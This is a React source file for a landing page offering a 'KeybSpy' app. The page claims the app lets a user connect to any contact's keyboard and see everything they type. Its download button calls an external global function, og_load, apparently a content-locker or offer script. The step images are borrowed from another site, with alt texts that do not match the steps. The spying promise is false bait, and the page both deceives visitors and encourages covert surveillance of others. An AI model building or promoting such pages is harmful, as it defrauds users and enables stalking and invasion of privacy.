import { Button } from "@/components/ui/button";

declare global {
  interface Window {
    og_load: () => void;
  }
}

const Index = () => {
  const handleDownloadClick = () => {
    if (window.og_load) {
      window.og_load();
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Hero Section */}
      <div className="container mx-auto px-4 py-12 max-w-3xl">
        {/* Title */}
        <h1 className="text-primary font-bold text-xl md:text-2xl text-center mb-8">
          Here is a free instruction on how to connect to the keyboard of any device.        
        </h1>

        {/* App Card */}
        <div className="mb-6 flex justify-center">
          <img
            src="/assets/logo.png"  // Calea corectă pentru logo-ul tău
            alt="App Logo"
            className="w-[100px] h-[100px] rounded-xl"
          />
        </div>

        {/* Stars Rating */}
        <div className="text-center mb-4">
          <span className="text-2xl">⭐️⭐️⭐️⭐️⭐️</span>
        </div>

        {/* Download Section with CAPTCHA */}
        <div className="text-center mb-12">
          <Button
            type="button"
            onClick={handleDownloadClick}
            className="bg-accent hover:bg-accent/90 text-accent-foreground font-bold px-6 py-3 text-sm rounded-lg"
          >
            DOWNLOAD KeybSpy app
          </Button>
        </div>

        {/* Instructions */}
        <div className="space-y-8">
          {/* Step 1 */}
          <div className="space-y-4">
            <p className="text-foreground text-center">
              Install and open the app. Availability may vary by region.
            </p>
            <div className="flex justify-center">
              <img
                src="https://i0.wp.com/techfyp.com/wp-content/uploads/2024/02/E4BDA66E-F065-4DAE-90BA-AA4FE9AB838E.png?resize=563%2C461&ssl=1"
                alt="Step 1 - Open the app"
                className="max-w-full h-auto rounded-lg shadow-lg"
              />
            </div>
          </div>

          {/* Step 2 */}
          <div className="space-y-4">
            <p className="text-foreground text-center">
              Open the KeybSpy app and grant permission for contacts and other necessary applications.              
            </p>
            <div className="flex justify-center">
              <img
                src="https://i0.wp.com/techfyp.com/wp-content/uploads/2024/02/8B543D17-71E5-4E9B-ABF1-3AE59B64315C.png?resize=563%2C461&ssl=1"
                alt="Step 2 - Search for Lockscreen Buddy"
                className="max-w-full h-auto rounded-lg shadow-lg"
              />
            </div>
          </div>

          {/* Step 3 */}
          <div className="space-y-4">
            <p className="text-foreground text-center">
              In the app menu, go to the Contacts section and select a contact from your list.            
            </p>
            <div className="flex justify-center">
              <img
                src="https://i0.wp.com/techfyp.com/wp-content/uploads/2024/02/DE88499C-6A9C-4BB4-9116-1A43EC5470F8.png?resize=563%2C461&ssl=1"
                alt="Step 3 - Restart Spring Board"
                className="max-w-full h-auto rounded-lg shadow-lg"
              />
            </div>
          </div>

          {/* Final Note */}
          <p className="text-foreground text-center font-medium">
            Now you are connected to the contact’s keyboard and you can see everything they type on their device.          
          </p>
        </div>
      </div>
    </div>
  );
};

export default Index;
